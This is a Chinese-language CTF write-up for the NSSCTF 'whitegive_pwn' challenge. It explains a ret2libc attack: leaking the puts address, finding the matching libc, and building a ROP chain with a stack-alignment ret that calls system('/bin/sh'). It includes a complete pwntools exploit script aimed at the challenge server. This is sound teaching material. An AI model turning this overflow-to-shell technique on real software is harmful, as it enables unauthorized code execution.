NSSCTF-whitegive_pwn

一、前言

这道题也是一道典型的ret2libc，不多介绍了。

攻击流程:

通过puts/write/read等函数泄露函数地址，找到对应版本的libc库，找到system和’/bin/sh’的地址，构造溢出。

二、题目

开启了栈不可执行保护。再到ida中静态分析

找到溢出点，通过puts函数泄露地址

需要用到ROPgadget工具查一下gadget片段，pop rdi ret这个片段用来传递参数，ret用来平衡system函数调用时栈顶满足16字节对齐。

三、EXP

rom pwn import*
from libcfind import*

sh = remote('node2.anna.nssctf.cn',28476)
elf = ELF('./pwn')

puts_plt = 0x00400520			#puts函数的plt地址，用来被call
main_addr = 0x004006D6			#用来返回到main
puts_got = elf.got['puts']		#puts函数的got地址，用来被泄露
POP_rdi_addr = 0x00400763		#用来传参
vlun_addr = 0x004006BA			
ret_addr = 0x00400509			#用来满足栈顶字节对齐

payload = 24*b'a'+p64(POP_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(vlun_addr)

sh.sendline(payload)

puts_real_addr= u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))#接收puts函数真实地址
print(hex(puts_real_addr))

libc = finder('puts',puts_real_addr)		#找到对应的libc库
libc_base = libc.libcbase					#libc基址

system_addr = libc.dump('system')			#system真实地址
bin_addr = libc.dump('str_bin_sh')			#/bin/shzhenshi1dizhi1

payload = 24*b'a'+p64(ret_addr)+p64(POP_rdi_addr)+p64(bin_addr)+p64(system_addr)+p64(main_addr)

sh.sendline(payload)

四、总结

system被调用时有一处汇编指令需要栈顶16字节对齐，所以要ret一次，ret的作用相当于pop，不影响system的调用。
